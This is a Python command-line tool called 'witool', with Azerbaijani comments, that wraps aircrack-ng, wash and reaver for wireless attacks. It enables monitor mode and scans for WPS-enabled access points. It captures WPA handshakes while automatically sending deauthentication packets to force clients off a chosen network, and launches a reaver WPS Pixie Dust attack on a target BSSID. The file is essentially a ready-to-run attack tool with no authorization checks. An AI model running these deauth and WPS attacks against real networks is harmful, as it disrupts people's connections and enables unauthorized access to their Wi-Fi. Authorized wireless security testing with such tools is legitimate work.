#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import shutil
import signal
import subprocess
import sys
import glob
import time

LOGO = r"""
            __/\ \__               /\_ \     
 __  __  __/\_\ \ ,_\   ___     ___\//\ \    
/\ \/\ \/\ \/\ \ \ \/  / __`\  / __`\\ \ \   
\ \ \_/ \_/ \ \ \ \ \_/\ \L\ \/\ \L\ \\_\ \_ 
 \ \___x___/'\ \_\ \__\ \____/\ \____//\____\
  \/__//__/   \/_/\/__/\/___/  \/___/ \/____/
                                             V 1.0
"""

GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# İnterfeys adının yadda saxlanıldığı müvəqqəti fayl
CONFIG_FILE = "/tmp/witool_iface.tmp"


def save_interface(iface):
  try:
    with open(CONFIG_FILE, "w") as f:
      f.write(iface)
  except Exception:
    pass


def get_saved_interface():
  if os.path.exists(CONFIG_FILE):
    try:
      with open(CONFIG_FILE, "r") as f:
        return f.read().strip()
    except Exception:
      pass
  return "wlan0"  # Əgər yaddaşda yoxdursa default olaraq wlan0 qaytarır


def cleanup(iface=None):
  if not iface:
    saved_iface = get_saved_interface()
    # Əgər yaddaşdakı managed adıdırsa, monitor versiyasını tapırıq (məsələn wlan0mon)
    iface = (
        saved_iface + "mon" if not saved_iface.endswith("mon") else saved_iface
    )

  print(
      f"\n{YELLOW}[*] Restoring network state and cleaning up ({iface})...{RESET}"
  )
  subprocess.run(
      ["sudo", "ip", "link", "set", iface, "down"],
      stdout=subprocess.DEVNULL,
      stderr=subprocess.DEVNULL,
  )
  subprocess.run(
      ["sudo", "iw", "dev", iface, "set", "type", "managed"],
      stdout=subprocess.DEVNULL,
      stderr=subprocess.DEVNULL,
  )
  # Monitor rejim şəkilçisini silib əsas interfeysi 'up' edirik
  base_iface = iface.replace("mon", "")
  subprocess.run(
      ["sudo", "ip", "link", "set", base_iface, "up"],
      stdout=subprocess.DEVNULL,
      stderr=subprocess.DEVNULL,
  )
  subprocess.run(
      ["sudo", "systemctl", "restart", "NetworkManager"],
      stdout=subprocess.DEVNULL,
      stderr=subprocess.DEVNULL,
  )

  # Faylı təmizləyirik
  if os.path.exists(CONFIG_FILE):
    os.remove(CONFIG_FILE)

  print(f"{GREEN}[+] Network restored. Internet is available again!{RESET}")


def signal_handler(sig, frame):
  cleanup()
  sys.exit(0)


def check_root():
  if os.geteuid() != 0:
    print(
        f"{RED}[-] Error: This operation requires root privileges! Please run"
        " with 'sudo'.{RESET}"
    )
    sys.exit(1)


def is_monitor_mode(iface):
  try:
    result = subprocess.run(
        ["iw", "dev"], capture_output=True, text=True, check=True
    )
    if iface in result.stdout and "type monitor" in result.stdout:
      return True
  except Exception:
    pass
  return False


def check_dependencies():
  tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "wash", "reaver"]
  missing = [t for t in tools if not shutil.which(t)]
  if missing:
    print(
        f"{YELLOW}[!] Warning: The following tools were not found:"
        f" {', '.join(missing)}{RESET}"
    )
    print(f"{YELLOW}[!] Some features may not work properly.{RESET}\n")


def cmd_monitor(iface):
  check_root()
  print(f"{BLUE}[*] Enabling monitor mode on {iface}...{RESET}")
  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
  subprocess.run(["sudo", "ip", "link", "set", iface, "down"])
  subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"])
  subprocess.run(["sudo", "ip", "link", "set", iface, "up"])

  # Əgər interfeys adının sonluğunda 'mon' yoxdursa, avtomatik əlavə edib yadda saxlayırıq
  mon_iface = iface if iface.endswith("mon") else iface + "mon"
  save_interface(mon_iface)

  print(
      f"{GREEN}[+] Success! {iface} is now in monitor mode (Saved as"
      f" {mon_iface}).{RESET}"
  )


def cmd_scan(iface):
  check_root()
  target_iface = iface if iface else get_saved_interface()

  if not is_monitor_mode(target_iface):
    print(
        f"{RED}[-] Error: '{target_iface}' is not in monitor mode!{RESET}"
        f" {YELLOW}Please enable monitor mode first using: sudo witool"
        f" --monitor <interface>{RESET}"
    )
    sys.exit(1)

  print(f"{BLUE}[*] Scanning for WPS-enabled on {target_iface}...{RESET}")
  try:
    subprocess.run(["sudo", "wash", "-i", target_iface])
  except KeyboardInterrupt:
    pass

def cmd_capture(iface, bssid, channel):
  check_root()
  target_iface = iface if iface else get_saved_interface()

  if not is_monitor_mode(target_iface):
    print(
        f"{RED}[-] Error: '{target_iface}' is not in monitor mode!{RESET}"
        f" {YELLOW}Please enable monitor mode first using: sudo witool"
        f" --monitor <interface>{RESET}"
    )
    sys.exit(1)

  print(
      f"{BLUE}[*] Capturing EAPOL Handshake for {bssid} on"
      f" {target_iface}...{RESET}"
  )
  subprocess.run(
      ["sudo", "iw", "dev", target_iface, "set", "channel", channel]
  )
  output_prefix = "witool_handshake"

  # Airodump-ng prosesini arxa planda işə salırıq
  airodump_proc = subprocess.Popen([
      "sudo",
      "airodump-ng",
      "-c",
      channel,
      "--bssid",
      bssid,
      "-w",
      output_prefix,
      target_iface,
  ])

  print(
      f"{YELLOW}[*] Automatic Deauth attack will be sent in 3"
      f" seconds...{RESET}"
  )

  try:
    time.sleep(3)
    print(f"{BLUE}[*] Sending Deauth packets to force handshake...{RESET}")
    subprocess.run([
        "sudo",
        "aireplay-ng",
        "--deauth",
        "10",
        "-a",
        bssid,
        target_iface,
    ],
                   stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)

    # İstifadəçi Ctrl+C basana qədər gözləyirik
    airodump_proc.wait()
  except KeyboardInterrupt:
    print(f"\n{YELLOW}[*] Stopping capture process...{RESET}")
    airodump_proc.terminate()
    airodump_proc.wait()

  # Ən son yaradılan .cap faylını tapırıq
  cap_files = glob.glob(f"{output_prefix}-*.cap")
  if cap_files:
    latest_cap = max(cap_files, key=os.path.getctime)

    # Faylda handshake olub-olmadığını yoxlayırıq
    check_res = subprocess.run(
        ["aircrack-ng", latest_cap], capture_output=True, text=True
    )

    if "0 handshake" not in check_res.stdout and (
        "1 handshake" in check_res.stdout or "handshake" in check_res.stdout
    ):
      print(
          f"{GREEN}[+] SUCCESS: Handshake captured and saved in"
          f" '{latest_cap}'!{RESET}"
      )
    else:
      print(
          f"{RED}[-] No handshake found. Cleaning up generated junk"
          f" files...{RESET}"
      )
      base_name = latest_cap[:-4]
      for f in glob.glob(f"{base_name}.*"):
        try:
          os.remove(f)
        except Exception:
          pass
      print(f"{YELLOW}[!] Cleaned up empty capture files successfully.{RESET}")

def cmd_wps(iface, bssid, channel):
  check_root()
  target_iface = iface if iface else get_saved_interface()

  if not is_monitor_mode(target_iface):
    print(
        f"{RED}[-] Error: '{target_iface}' is not in monitor mode!{RESET}"
        f" {YELLOW}Please enable monitor mode first using: sudo witool"
        f" --monitor <interface>{RESET}"
    )
    sys.exit(1)

  print(
      f"{BLUE}[*] Launching WPS Pixie Dust attack on {bssid} using"
      f" {target_iface}...{RESET}"
  )
  try:
    subprocess.run([
        "sudo",
        "reaver",
        "-i",
        target_iface,
        "-b",
        bssid,
        "-c",
        channel,
        "-K",
        "1",
        "-vv",
    ])
  except KeyboardInterrupt:
    print(f"\n{YELLOW}[*] Attack stopped by user.{RESET}")


def cmd_managed(iface):
  check_root()
  target_iface = iface if iface else get_saved_interface()
  print(f"{BLUE}[*] Switching interface back to managed mode...{RESET}")
  cleanup(target_iface)


def main():
  signal.signal(signal.SIGINT, signal_handler)

  parser = argparse.ArgumentParser(
      description="witool - Wireless Penetration Testing Tool (CLI Edition)",
      usage="witool [options]",
      add_help=False,
  )

  parser.add_argument("-h", "--help", action="store_true", help="Show help menu")
  parser.add_argument(
      "-m",
      "--monitor",
      nargs="?",
      const="wlan0",
      metavar="IFACE",
      help="Enable monitor mode on interface (default: wlan0)",
  )
  parser.add_argument(
      "-s",
      "--scan",
      nargs="?",
      const=argparse.SUPPRESS,
      metavar="IFACE",
      help="Scan WPS status using wash (uses saved interface by default)",
  )
  parser.add_argument(
      "-c",
      "--capture",
      nargs="+",
      metavar="ARGS",
      help=(
          "Capture EAPOL handshake: witool --capture [IFACE] <BSSID> <CHANNEL>"
      ),
  )
  parser.add_argument(
      "-w",
      "--wps",
      nargs="+",
      metavar="ARGS",
      help=(
          "Perform WPS Pixie Dust attack: witool --wps [IFACE] <BSSID> <CHANNEL>"
      ),
  )
  parser.add_argument(
      "-n",
      "--normal",
      nargs="?",
      const=argparse.SUPPRESS,
      metavar="IFACE",
      help="Switch back to managed mode (uses saved interface by default)",
  )

  if len(sys.argv) == 1 or "--help" in sys.argv or "-h" in sys.argv:
    print(BLUE + LOGO + RESET)
    parser.print_help()
    sys.exit(0)

  args = parser.parse_args()
  check_dependencies()

  if args.monitor:
    cmd_monitor(args.monitor)
  elif args.scan is not None:
    # args.scan ya None-dur (verilməyib), ya boşdur (const yoxdur deyə qovuşur), ya da dəyəri var
    iface = args.scan if isinstance(args.scan, str) else None
    cmd_scan(iface)
  elif args.capture:
    # Capture üçün: [IFACE, BSSID, CHANNEL] və ya sadəcə [BSSID, CHANNEL] ola bilər
    if len(args.capture) == 3:
      iface, bssid, channel = args.capture
    elif len(args.capture) == 2:
      iface = None
      bssid, channel = args.capture
    else:
      print(
          f"{RED}[-] Error: Invalid arguments for capture! Use: witool"
          " --capture [IFACE] <BSSID> <CHANNEL>{RESET}"
      )
      sys.exit(1)
    cmd_capture(iface, bssid, channel)
  elif args.wps:
    # WPS üçün də eyni mantıq: [IFACE, BSSID, CHANNEL] və ya [BSSID, CHANNEL]
    if len(args.wps) == 3:
      iface, bssid, channel = args.wps
    elif len(args.wps) == 2:
      iface = None
      bssid, channel = args.wps
    else:
      print(
          f"{RED}[-] Error: Invalid arguments for WPS! Use: witool --wps [IFACE]"
          " <BSSID> <CHANNEL>{RESET}"
      )
      sys.exit(1)
    cmd_wps(iface, bssid, channel)
  elif args.normal is not None:
    iface = args.normal if isinstance(args.normal, str) else None
    cmd_managed(iface)


if __name__ == "__main__":
  main()